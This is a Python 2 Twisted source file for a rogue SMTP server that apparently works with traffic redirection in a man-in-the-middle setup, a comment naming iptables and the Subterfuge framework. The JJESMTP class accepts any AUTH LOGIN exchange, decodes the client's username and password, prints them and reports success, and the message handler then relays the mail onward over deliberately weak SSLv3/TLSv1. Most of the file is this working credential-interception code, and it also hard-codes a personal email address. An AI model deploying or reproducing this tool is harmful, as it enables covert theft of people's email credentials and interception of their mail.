import sys
import binascii

from OpenSSL import SSL

from email.Header import Header
from email.base64MIME import encode as encode_base64
from zope.interface import implements

from twisted.internet import defer, reactor, ssl
from twisted.mail import smtp
from twisted.mail.imap4 import LOGINCredentials
from twisted.python import log
from twisted.internet.interfaces import ITLSTransport, ISSLTransport

try:
	from cStringIO import StringIO
except ImportError:
	from StringIO import StringIO

		

class JJMessage(object):
	implements(smtp.IMessage)

	def __init__(self, protocol, recipient):
		self.protocol = protocol
		self.recipient = str(recipient)
		self.lines = []

	def lineReceived(self, line):
		self.lines.append(line)

	def eomReceived(self):
		print "New messsage received."
		self.lines.append('')
		messageData = '\n'.join(self.lines)

		# Really send mail here
		print 'REALLY SENDING THE MAIL'

		# this is just a test because of ipfw forwarding all traffic to my own machine -> infinite loop yo!
		self.protocol.destPort = 587
		self.protocol.destHost = 'smtp.1und1.de'
		self.protocol.username = 'jonathan@pirnay.com'
		self.protocol.password = '<INSERT MAIL HERE>' 

		msg = StringIO(str(messageData))
		dfd = sendmail(self.protocol.username, self.protocol.password, self.protocol.origin, self.recipient, msg, self.protocol.destHost, self.protocol.destPort)
		dfd.addCallback(lambda result: lp("Real mail sent"))
		return defer.succeed(None)
		

	def connectionLost(self):
		print "Connection lost unexpectedly"

class JJMessageDelivery(object):
	implements(smtp.IMessageDelivery)

	def __init__(self, protocol):
		self.protocol = protocol

	def receivedHeader(self, helo, origin, recipients):
		clientHostname, clientIP = helo

	def validateFrom(self, helo, origin):
		self.protocol.origin = origin
		return origin

	def validateTo(self, user):
		return lambda: JJMessage(self.protocol, user)

class JJESMTP(smtp.ESMTP):

	# scraped stuff we need for later when actually sending the mail
	username = None
	password = None

	origin = None


	def __init__(self, chal = None, contextFactory = None):
		print "-- Say hello to JJESMTP, bitches!"
		smtp.ESMTP.__init__(self, chal, contextFactory)
		self.delivery = JJMessageDelivery(self)

	def sendLine(self, line):
		print "Sending: " + line
		return self.transport.writeSequence((line, self.delimiter))

	def lineReceived(self, line):
		print "Received: " + line
		self.resetTimeout()
		return getattr(self, 'state_' + self.mode)(line)

	def state_AUTH(self, response):
		
		if response is None:
		    challenge = self.challenger.getChallenge()
		    encoded = challenge.encode('base64')
		    self.sendCode(334, encoded)
		    return

		if response == '*':
		    self.sendCode(501, 'Authentication aborted')
		    self.challenger = None
		    self.mode = 'COMMAND'
		    return

		self.credentials_base64 = response
		try:
		    uncoded = response.decode('base64')
		    print uncoded
		    if not self.username:
		    	self.username = uncoded
		    	# Now ask for password
		    	self.sendCode(334, 'UGFzc3dvcmQ6')
		    	return
		    elif not self.password:
		    	self.password = uncoded
		    
		except binascii.Error:
			self.sendCode(501, 'Syntax error in parameters or arguments')
			return

		# simply say all is well if we have anything
		if self.username and self.password:
			self.mode = 'COMMAND'
			self.authenticated = True
			self.sendCode(235, 'Authentication successful.')


# For our SSL shizzl
class ServerTLSContext(ssl.DefaultOpenSSLContextFactory):
    def __init__(self, *args, **kw):
        kw['sslmethod'] = SSL.TLSv1_METHOD
        ssl.DefaultOpenSSLContextFactory.__init__(self, *args, **kw)


class JJSMTPFactory(smtp.SMTPFactory):
	protocol = JJESMTP

	def buildProtocol(self, addr):
		log.msg("building protocol")
		
		#
		# @todo: Here we should get the real host and port from iptables in Subterfuge somehow
		#
		
		destHost = "wp185.webpack.hosteurope.de"
		destPort = 25

		proto = smtp.SMTPFactory.buildProtocol(self, addr)
		proto.destHost = destHost
		proto.destPort = destPort

		# AUTH challengers
		proto.challengers = {"LOGIN": LOGINCredentials}

		# SSL
		proto.ctx = ServerTLSContext(privateKeyFileName='certs/server.key', certificateFileName='certs/server.crt')

		return proto


def configureMailTraffic():
	print 'Configuring mail traffic'
	log.startLogging(sys.stdout)
	
	reactor.listenTCP(9998, JJSMTPFactory(), interface="127.0.0.1")
	reactor.run()

def lp(x):
	print x
	return None

def sendmail(
    authenticationUsername, authenticationSecret,
    fromAddress, toAddress,
    messageFile,
    smtpHost, smtpPort=25
    ):

    contextFactory = ssl.ClientContextFactory()
    contextFactory.method = SSL.SSLv3_METHOD

    resultDeferred = defer.Deferred()

    senderFactory = smtp.ESMTPSenderFactory(
        authenticationUsername,
        authenticationSecret,
        fromAddress,
        toAddress,
        messageFile,
        resultDeferred,
        contextFactory=contextFactory)

    reactor.connectTCP(smtpHost, smtpPort, senderFactory)

    return resultDeferred

configureMailTraffic()